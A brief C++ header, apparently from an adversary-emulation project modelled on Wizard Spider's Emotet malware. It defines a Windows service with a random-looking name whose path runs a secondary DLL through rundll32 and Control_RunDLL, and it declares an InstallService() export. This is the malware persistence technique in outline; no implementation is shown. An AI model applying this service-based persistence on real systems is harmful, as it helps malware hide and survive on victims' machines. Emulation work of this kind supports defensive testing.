#pragma once

#include "stdio.h"
#include <iostream>

#define SERVICE_NAME L"randomname"
#define SERVICE_PATH L"rundll32.exe C:\\Users\\idavila\\Documents\\dev\\wizard_spider\\Resources\\Emotet\\secondaryDLL\\Debug\\secondaryDLL.dll,Control_RunDLL"

#ifdef SERVICE_EXPORT
#define SERVICE __declspec(dllexport)
#else
#define SERVICE __declspec(dllimport)
#endif

SERVICE int InstallService();